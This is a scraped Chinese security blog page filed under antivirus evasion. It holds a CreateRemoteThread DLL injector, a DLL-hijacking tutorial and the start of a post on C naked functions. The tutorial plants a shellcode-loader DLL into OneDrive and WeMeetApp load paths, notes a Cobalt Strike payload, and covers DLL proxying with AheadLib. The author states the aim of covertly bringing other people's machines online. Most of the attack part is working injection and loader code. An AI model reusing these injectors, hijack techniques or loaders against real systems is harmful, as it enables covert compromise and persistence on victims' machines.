p32.th32ProcessID;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (::Process32Next(lpSnapshot, &amp;p32));</span><br><span class="line">::CloseHandle(lpSnapshot);</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line">	DWORD <span class="title function_">RemoteThreadInject</span><span class="params">(DWORD Pid,LPCWSTR DllName)</span>&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD size = <span class="number">0</span>;</span><br><span class="line">	DWORD DllAddr = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//1.打开进程</span></span><br><span class="line">	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,Pid);</span><br><span class="line">	<span class="keyword">if</span> (hprocess == <span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;OpenProcessError:%d&quot;</span>,GetLastError());</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">		size = (wcslen(DllName)+<span class="number">1</span>)*<span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">		<span class="comment">//2.申请空间</span></span><br><span class="line">		LPVOID pAllocMemory = VirtualAllocEx(hprocess,<span class="literal">NULL</span>,size,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">		<span class="keyword">if</span> (pAllocMemory == <span class="literal">NULL</span>)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocExError:%d&quot;</span>,GetLastError());</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;		</span><br><span class="line">		<span class="comment">//3.写入内存</span></span><br><span class="line">		BOOL write = WriteProcessMemory(hprocess,pAllocMemory,DllName,size,<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (pAllocMemory == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemoryError:%d&quot;</span>,GetLastError());</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;		</span><br><span class="line">		<span class="comment">//4.获取LoadLibrary-kenrnel32.dll</span></span><br><span class="line">		FARPROC pThread = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>),<span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">		LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUINE)pThread;</span><br><span class="line">		<span class="comment">//5.创建线程</span></span><br><span class="line">		HANDLE hThread = CreateRemoteThread(hprocess, <span class="literal">NULL</span>, <span class="number">0</span>, addr, pAllocMemory,<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThreadError:%d&quot;</span>,GetLastError());</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;		</span><br><span class="line">		<span class="comment">//6.等待线程函数结束</span></span><br><span class="line">		WaitForSingleObject(hThread,<span class="number">-1</span>);</span><br><span class="line">		<span class="comment">//7.释放DLL空间</span></span><br><span class="line">		VirtualFreeEx(hprocess,pAllocMemory,size,MEM_DECOMMIT);</span><br><span class="line">		<span class="comment">//8.关闭句柄</span></span><br><span class="line">		CloseHandle(hprocess);</span><br><span class="line">		<span class="keyword">return</span> TRUE;	</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	    <span class="comment">//根据进程名获得PID</span></span><br><span class="line">			DWORD PID  = GetProcessPID(<span class="string">L&quot;notepad.exe&quot;</span>);</span><br><span class="line">			<span class="comment">//根据进程名和DLL的路径名来加载，这里主要是因为我们自己写的dll是不存在system32里面的所以要给绝对路径)</span></span><br><span class="line">			RemoteThreadInject(PID, <span class="string">L&quot;C:\\Users\\test\\Desktop\\x64.dll&quot;</span>);</span><br><span class="line">			</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="可能要注意的问题"><a href="#可能要注意的问题" class="headerlink" title="可能要注意的问题"></a>可能要注意的问题</h2><h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><p>VS2022中可以指定我们自己的编码方式</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925105516683.png" alt="image-20240925105516683"></p>
<p>现在VS生成的项目一般统一使用Unicode，但是统一成Unicode之后，虽然解决了乱码问题，但是在文本上编码需要比ascii多一倍的空间</p>
<p>所以，<strong>如果是文本上纯英文，那么使用ascii就行了</strong></p>
<p>VS里面有两种API，一种是A系，一种是W系。这两种的区别就是其基本的编码方式，在项目中会帮助你自动扩展到指定的系中</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925110038351.png" alt="image-20240925110038351"></p>
<p>如果想写的通用一点，可以使用__T，在使用之前要声明tchar.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line">MessageBox(<span class="number">0</span>,_T(<span class="string">&quot;1&quot;</span>),_T(<span class="string">&quot;1&quot;</span>),MB_OK);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Visual C++里边定义字符串的时候，用T来保证兼容性，VC支持ascii和unicode两种字符类型，用T</span><br><span class="line">可以保证从ascii编码类型转换到unicode编码类型的时候，程序不需要修改</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int _tmain(int argc, TCHAR* argv[])</span><br><span class="line">//这种用于unicode条件下</span><br><span class="line">BOOL bRet = ZwCreateThreadExInject((DWORD)_tstol(argv[1]), argv[2]);</span><br><span class="line">//可以使用_tstol转换参数</span><br></pre></td></tr></table></figure>

<h3 id="运行库问题"><a href="#运行库问题" class="headerlink" title="运行库问题"></a>运行库问题</h3><p>在本地跑没有问题的程序，在虚拟机或者其他环境跑有问题，比如报错缺少vcruntime140d.dll</p>
<p>这是因为目标环境可能没有装vs，这时候就需要我们把dll包在我们编译的环境里面</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925110423385.png" alt="image-20240925110423385"></p>
<p>多线程模式下会包裹更加全面的dll文件，而默认的多线程调试模式下则不会，为了确保我们的程序能够正确的在其他人的电脑上面生成</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/Dll%E6%B3%A8%E5%85%A5/" data-id="cm1zwlrfk0004u0v6bhv99zoe" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/Dll劫持" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Dll%E5%8A%AB%E6%8C%81/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.553Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Dll-Hijacking"><a href="#Dll-Hijacking" class="headerlink" title="Dll Hijacking"></a>Dll Hijacking</h1><p><strong>为什么Dll劫持应用这么广泛</strong></p>
<h2 id="低成本挖掘"><a href="#低成本挖掘" class="headerlink" title="低成本挖掘"></a>低成本挖掘</h2><p>随着版本的更新，代码的更迭，应用程序自带的Dll数不胜数，几乎随便打开一个应用程序的主目录，都能看见一大把Dll，它们中的很多都满足被劫持的条件</p>
<h2 id="样本存活时间相对较长"><a href="#样本存活时间相对较长" class="headerlink" title="样本存活时间相对较长"></a>样本存活时间相对较长</h2><p>说它样本存活时间相对较长，是以其他exe，shellcode等恶意文件来对比的，因为dll本身更新迭代的速度很快，杀软不可能总是去匹配这些文件。所以查杀dll的力度，至少在三环要小得多</p>
<p>dll本身有加载顺序，这也是Dll劫持的根本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXE所在目录</span><br><span class="line">当前目录GetCurrentDirectory()</span><br><span class="line">系统目录GetSystemDirectory()</span><br><span class="line">WINDOWS目录GetWindowsDirectory()</span><br><span class="line">环境变量 PATH 所包含的目录</span><br></pre></td></tr></table></figure>

<p>下面我们开始介绍几种Dll劫持</p>
<h1 id="劫持后一次执行"><a href="#劫持后一次执行" class="headerlink" title="劫持后一次执行"></a>劫持后一次执行</h1><p>打开我们的Process Monitor，来监测一下某些程序启动的事件,这里我们要注意一个细节，当我们想要寻找存在Dll劫持的程序的时候，要把exe托出它原来的环境来执行，原因是上面所提到的dll加载顺序，我们需要保证找到的dll，一定是exe所在目录加载的。不然exe在启动的时候还是会优先去找它原来的dll</p>
<p>我这里找一个软件作为示例</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005112105673.png" alt="image-20241005112105673"></p>
<p>在下面这张图中可以看见，由于我将exe文件拖出了原本的环境，所以有些dll的加载路径变成了当前exe路径，有些则不变，我们需要的是前者</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005112141804.png" alt="image-20241005112141804"></p>
<p>这里提一下，之所以需要Result的结果是NAME NOT FOUND是因为我们就是需要这些Dll在CreateFile这个Operation时没被找到，这样对软件本身的影响是最小的。</p>
<p>我们就以下面这个dll为例</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005122322168.png" alt="image-20241005122322168"></p>
<p>首先先在vs2022中编写一个dll，来个弹窗或者弹计算器都行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;1&quot;</span>, <span class="string">L&quot;1&quot;</span>, MB_OK);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;2&quot;</span>, <span class="string">L&quot;2&quot;</span>, MB_OK);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们将Dll改名，改为dbghelp.dll，然后执行</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005122630554.png" alt="image-20241005122630554"></p>
<p>这时候报了一个错，这说明exe中用到，或者说声明了这个Dll中的一些函数，当exe链接dll时，并没有在我们dll的导出表里面找到这些函数的定义</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005122644612.png" alt="image-20241005122644612"></p>
<p>所以这个时候我们就需要手动的将这些函数声明出来</p>
<p>但是我们怎么知道exe里面可能用了dll里面的哪些函数呢，这就需要我们看exe的导入表，也就用到了dumpbin（vs2022自带）,多余的我导出表部分我就省略了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\su\Desktop\typora-activation&gt; dumpbin /Imports .\WeMeetApp.exe</span><br><span class="line"><span class="title function_">Microsoft</span> <span class="params">(R)</span> COFF/PE Dumper Version 14.38.33139.0</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of file .\WeMeetApp.exe</span><br><span class="line"></span><br><span class="line">File Type: EXECUTABLE IMAGE</span><br><span class="line"></span><br><span class="line">  Section contains the following imports:</span><br><span class="line"></span><br><span class="line">    VERSION.dll</span><br><span class="line">             1400C4838 Import Address Table</span><br><span class="line">             1400E8A58 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">                           8 GetFileVersionInfoW</span><br><span class="line">                          10 VerQueryValueW</span><br><span class="line">                           7 GetFileVersionInfoSizeW</span><br><span class="line"></span><br><span class="line">  ......................................................</span><br><span class="line">    dbghelp.dll</span><br><span class="line">             1400C4868 Import Address Table</span><br><span class="line">             1400E8A88 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">                          BE SymSetOptions</span><br><span class="line">                          C4 SymSetSearchPathW</span><br><span class="line">                          33 SymCleanup</span><br><span class="line">                          58 SymFromAddr</span><br><span class="line">                          88 SymGetSearchPathW</span><br><span class="line">                          6B SymGetLineFromAddr64</span><br><span class="line">                          A2 SymInitialize</span><br><span class="line"></span><br><span class="line">  ...................................................</span><br><span class="line">  Summary</span><br><span class="line"></span><br><span class="line">        A000 .data</span><br><span class="line">        9000 .pdata</span><br><span class="line">       27000 .rdata</span><br><span class="line">        2000 .reloc</span><br><span class="line">       27000 .rsrc</span><br><span class="line">       C2000 .text</span><br><span class="line">        1000 _RDATA</span><br><span class="line">        1000 malloc_h</span><br></pre></td></tr></table></figure>

<p>我们按照这些表里面的函数，在Dllmain里面声明一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">void</span> <span class="title function_">SymSetOptions</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">void</span> <span class="title function_">SymSetSearchPathW</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">void</span> <span class="title function_">SymCleanup</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">void</span> <span class="title function_">SymFromAddr</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">void</span> <span class="title function_">SymGetSearchPathW</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">void</span> <span class="title function_">SymGetLineFromAddr64</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">void</span> <span class="title function_">SymInitialize</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看见，成功了</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005123101288.png" alt="image-20241005123101288"></p>
<p>像这种一次执行的的Dll劫持，就适合配合其他的工具来进行上线</p>
<h3 id="需要注意的几个问题"><a href="#需要注意的几个问题" class="headerlink" title="需要注意的几个问题"></a>需要注意的几个问题</h3><p>这样进行劫持，还是有可能会让我们的程序没有办法正常运行，因为我们链上了一个原本不存在的dll，这样<strong>整个程序的执行流可能还是会有改变</strong>，程序会执行进入一个我们未知的分支，这就主要看我们测试的结果了，在慢慢的积累中，可以自己找到一些动静小，也基本不影响原执行流的dll</p>
<p>这里给一个网站<a target="_blank" rel="noopener" href="https://hijacklibs.net/">https://hijacklibs.net/</a></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005123850111.png" alt="image-20241005123850111"></p>
<p>第二个要注意的问题，就是修改导出表处碰见的的可能的第二种报错，那就是导出表函数和dll名不匹配</p>
<p>再拿刚刚的dbghelp举例，我们把dbghelp.dll改为CRYPTBASE.DLL</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005123924761.png" alt="image-20241005123924761"></p>
<p>这时候会有另一个报错，这说明我们函数的exe导入表和dll声明的函数不匹配，当然也可能有其他复杂的原因，我只是在这里记录一下</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005124016526.png" alt="image-20241005124016526"></p>
<h1 id="劫持DLL不影响正常的执行流"><a href="#劫持DLL不影响正常的执行流" class="headerlink" title="劫持DLL不影响正常的执行流"></a>劫持DLL不影响正常的执行流</h1><p>我们上面介绍了会影响正常执行流的办法，那么有没有办法不影响程序执行呢</p>
<p>答案同样是有，我们重新寻找适合的DLL</p>
<p>这里我们以OneDrive为例，因为我们大部分的WIn的电脑上面都有这个软件，里面有一个Dll</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005192259924.png" alt="image-20241005192259924"></p>
<p>这个Dll我们通过ProcessMonitor观察发现，它不仅会从System32下加载，还会从我们的目录下加载</p>
<p>这就给了我们机会</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005192519534.png" alt="image-20241005192519534"></p>
<p>像这样不影响执行流的Dll可能是在程序初始化的时候进行加载，然后在进行某个功能的时候再起作用</p>
<p>这样我们就可以相对隐蔽的让别人的机子上线</p>
<p><strong>这里强调一下，现在只是演示Dll劫持，免杀是没有做的，正常无论是传Dll，甚至是编译过程都会被拦</strong></p>
<p>随便写个shellcode loader测试一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode⻓度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span>* shellcode = (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf),</span><br><span class="line">            MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        CopyMemory(shellcode, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)shellcode, <span class="literal">NULL</span>,</span><br><span class="line">            <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">        WaitForSingleObject(hThread, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里有个细节，<strong>里 WaitForSingleObject 的参数一定要写成0</strong>，代表异步进行，主线程接着跑，不等待子线程，也就 是shellcode线程。</p>
<p>如果参数设为-1，那么线程将会“锁死”，这样的后果是shellcode有可能依赖进程主线程继续初始化才能 执行，而进程主线程在等待子线程，也就是shellcode执行的线程，会相互等待，所以我们这里参数为 0，或者不写 WaitForSingleObject 函数，子线程和主线程异步执行。</p>
<p>shellcode就也不免杀，以后再说，先cs随便生成一个</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005193314323.png" alt="image-20241005193314323"></p>
<p>可以看见，OneDrive正确打开，也没有报错</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005193128413.png" alt="image-20241005193128413"></p>
<p>上线（这里两个OneDrive是机子卡了多按了一下，一个默认生成的exe是想测试一下能不能正常上线）</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005193207141.png" alt="image-20241005193207141"></p>
<h1 id="Dll转发"><a href="#Dll转发" class="headerlink" title="Dll转发"></a>Dll转发</h1><p>上面所提到的办法，我们往往要花时间去研究具体哪个Dll能够满足我们的要求，但是现在如果我们马上就想让一个Dll能被我们利用，那怎么办呢</p>
<p>那就可以Dll转发，也就是在加载的时候，先加载我们的恶意Dll，然后转发到正常的Dll中，保证程序的正常执行</p>
<p>这样我们可以选择的Dll范围就大了，不一定要一个一个在Process Monitor里面看，然后试，直接随便找一个</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005194205620.png" alt="image-20241005194205620"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005194317524.png" alt="image-20241005194317524"></p>
<p>用AheadLib生成代码</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005195037253.png" alt="image-20241005195037253"></p>
<p>找到这段代码里面的Dllmain，补上我们的shellcodeloader</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005195024999.png" alt="image-20241005195024999"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005195116812.png" alt="image-20241005195116812"></p>
<p>把原Dll改为我们在AheadLib里改的名字（一般为原名＋Org），然后放到一个文件夹里面，如果要验证这个转发，最好把上面原来的Dll劫持给删了</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005195421119.png" alt="image-20241005195421119"></p>
<p>新的，上线成功</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241005195532872.png" alt="image-20241005195532872"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/Dll%E5%8A%AB%E6%8C%81/" data-id="cm1zwlrfk0003u0v69i2ja23x" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/C语言" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/C%E8%AF%AD%E8%A8%80/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.552Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) function</span><br></pre></td></tr></table></figure>

<p>   <strong>此关键字仅用于x86系统</strong>，多用于虚拟设备驱动。此关键字可以使编译器在生成代码时不包含任何注释或标记。仅可以对函数的定义使用，不能用于数据声明、定义，或者函数的声明。</p>
<p>  如果想要使用x64，需要额外弄一个asm文件，这个后面会说</p>
<p>这里给出一个默认C调用的demo，裸函数可以依照这个结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>  __declspec(naked) Function_Plus()&#123;</span><br><span class="line"></span><br><span class="line">	__asm&#123;</span><br><span class="line">			<span class="comment">//1.提栈</span></span><br><span class="line">			push ebp</span><br><span class="line">			mov ebp,esp</span><br><span class="line">			sub esp,<span class="number">0x40</span></span><br><span class="line">			</span><br><span class="line">			<span class="comment">//2.保存现场</span></span><br><span class="line">			push ebx</span><br><span class="line">			push esi</span><br><span class="line">			push edi</span><br><span class="line">			<span class="comment">//3.填充缓冲区</span></span><br><span class="line">			<span class="comment">//req stos:eax ecx edi   eax:填充到内存里面的值 ecx:填充的次数  edi:填充的地址</span></span><br><span class="line">			lea edi , dword ptr ds:[ebp<span class="number">-0x40</span>]</span><br><span class="line">			mov eax ,<span class="number">0xCCCCCCCC</span></span><br><span class="line">			mov ecx,<span 